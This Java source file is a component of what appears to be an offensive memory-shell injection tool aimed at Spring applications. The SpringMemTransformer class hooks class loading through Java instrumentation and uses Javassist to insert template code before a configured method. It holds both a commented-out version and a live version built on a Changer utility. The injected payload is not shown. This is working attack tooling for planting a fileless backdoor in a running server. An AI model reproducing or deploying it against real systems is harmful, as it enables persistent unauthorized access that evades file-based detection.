package com.stdout.Transformers;

import com.stdout.Config.ShellConfig;
import com.stdout.Utils.Changer;
import com.stdout.Utils.Redefine.MyReader;
import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class SpringMemTransformer implements ClassFileTransformer {
    public static final String TransformedClassName = ShellConfig.SpringMemTransformerConfig.TransformedClassName;
    public static final String TransformedEqualName = ShellConfig.SpringMemTransformerConfig.TransformedEqualName;
    public static final String TransformedMethodName = ShellConfig.SpringMemTransformerConfig.TransformedMethodName;

//    @Override
//    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
//        if (className.equals(TransformedEqualName)) {
//            try {
//                System.out.println("asdsd");
//                ClassPool cp = ClassPool.getDefault();
//                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
//                cp.insertClassPath(ccp);
//                System.out.println("123132131");
//                CtClass cc = cp.get(TransformedClassName);
//                CtMethod m = cc.getDeclaredMethod(TransformedMethodName);
//                m.insertBefore(MyReader.readSource("start.txt"));
//                byte[] byteCode = cc.toBytecode();
//                cc.detach();
//                return byteCode;
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//        }
//        return null;
//    }
//
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals(TransformedEqualName)) {
            try {
                return Changer.ChangeSource(classBeingRedefined, TransformedClassName, TransformedMethodName, ShellConfig.TemplatesConfig.StartTransformer, true);
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }
        return null;
    }
}
